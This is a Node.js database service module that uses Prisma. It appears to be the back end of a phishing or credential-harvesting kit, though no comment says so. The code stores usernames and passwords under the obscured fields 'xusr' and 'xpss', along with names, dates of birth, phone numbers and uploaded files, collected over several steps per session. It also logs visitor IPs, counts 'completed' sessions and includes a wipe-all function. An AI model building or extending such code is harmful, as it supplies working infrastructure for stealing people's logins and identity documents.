const { PrismaClient } = require('@prisma/client');
const crypto = require('crypto');

class DatabaseService {
  constructor() {
    this.prisma = new PrismaClient();
  }

  // Generate unique session ID
  generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
  }

  // Create a new user session
  async createUserSession(ip, userAgent) {
    const sessionId = this.generateSessionId();
    
    const userSession = await this.prisma.userSession.create({
      data: {
        sessionId,
        ip,
        userAgent
      }
    });
    
    return userSession;
  }

  // Store login data
  async storeLoginData(sessionId, loginData, ip, userAgent) {
    return await this.prisma.loginData.create({
      data: {
        sessionId,
        xusr: loginData.xusr,
        xpss: loginData.xpss,
        ip,
        userAgent
      }
    });
  }

  // Store info data
  async storeInfoData(sessionId, infoData, ip, userAgent) {
    if (!sessionId) {
      throw new Error('Session ID is required');
    }
    
    return await this.prisma.infoData.create({
      data: {
        sessionId,
        xname1: infoData.xname1,
        xname2: infoData.xname2,
        xdob: infoData.xdob,
        xtel: infoData.xtel,
        ip,
        userAgent
      }
    });
  }

  // Store upload data
  async storeUploadData(sessionId, uploadData, ip, userAgent) {
    if (!sessionId) {
      throw new Error('Session ID is required');
    }
    
    return await this.prisma.uploadData.upsert({
      where: {
        sessionId: sessionId
      },
      update: {
        filename: uploadData.filename,
        originalName: uploadData.originalName,
        fileSize: uploadData.size,
        filePath: uploadData.path,
        mimeType: uploadData.mimeType,
        ip,
        userAgent,
        timestamp: new Date()
      },
      create: {
        sessionId,
        filename: uploadData.filename,
        originalName: uploadData.originalName,
        fileSize: uploadData.size,
        filePath: uploadData.path,
        mimeType: uploadData.mimeType,
        ip,
        userAgent
      }
    });
  }

  // Store final data
  async storeFinalData(sessionId, finalData, ip, userAgent) {
    if (!sessionId) {
      throw new Error('Session ID is required');
    }
    
    return await this.prisma.finalData.create({
      data: {
        sessionId,
        xusr: finalData.xusr,
        xpss: finalData.xpss,
        xname1: finalData.xname1,
        xname2: finalData.xname2,
        xdob: finalData.xdob,
        xtel: finalData.xtel,
        ip,
        userAgent
      }
    });
  }

  // Track site visitor
  async trackVisitor(ip, userAgent, path, method = 'GET') {
    return await this.prisma.siteVisitor.create({
      data: {
        ip,
        userAgent,
        path,
        method
      }
    });
  }

  // Log admin action
  async logAdminAction(action, details, ip, userAgent) {
    return await this.prisma.adminLog.create({
      data: {
        action,
        details,
        ip,
        userAgent
      }
    });
  }

  // Get all user sessions with their data
  async getAllUserSessions() {
    return await this.prisma.userSession.findMany({
      include: {
        loginData: true,
        infoData: true,
        uploadData: true,
        finalData: true
      },
      orderBy: {
        createdAt: 'desc'
      }
    });
  }

  // Get session statistics
  async getSessionStats() {
    const [
      totalSessions,
      completedSessions,
      totalVisitors,
      uniqueIPs
    ] = await Promise.all([
      this.prisma.userSession.count(),
      this.prisma.finalData.count(),
      this.prisma.siteVisitor.count(),
      this.prisma.siteVisitor.findMany({
        select: { ip: true },
        distinct: ['ip']
      })
    ]);

    return {
      totalSessions,
      completedSessions,
      totalVisitors,
      uniqueIPs: uniqueIPs.length
    };
  }

  // Get recent visitors
  async getRecentVisitors(limit = 100) {
    return await this.prisma.siteVisitor.findMany({
      orderBy: {
        timestamp: 'desc'
      },
      take: limit
    });
  }

  // Delete user session by ID
  async deleteUserSession(sessionId) {
    return await this.prisma.userSession.delete({
      where: { sessionId }
    });
  }

  // Get user session by ID
  async getUserSession(sessionId) {
    return await this.prisma.userSession.findUnique({
      where: { sessionId },
      include: {
        loginData: true,
        infoData: true,
        uploadData: true,
        finalData: true
      }
    });
  }

  // Delete all data from all tables
  async deleteAllData() {
    try {
      // Delete in order to respect foreign key constraints
      await this.prisma.loginData.deleteMany();
      await this.prisma.infoData.deleteMany();
      await this.prisma.uploadData.deleteMany();
      await this.prisma.finalData.deleteMany();
      await this.prisma.userSession.deleteMany();
      await this.prisma.siteVisitor.deleteMany();
      await this.prisma.adminLog.deleteMany();
      
      return { success: true, message: 'All data deleted successfully' };
    } catch (error) {
      console.error('Error deleting all data:', error);
      throw error;
    }
  }

  // Close database connection
  async disconnect() {
    await this.prisma.$disconnect();
  }
}

module.exports = new DatabaseService();
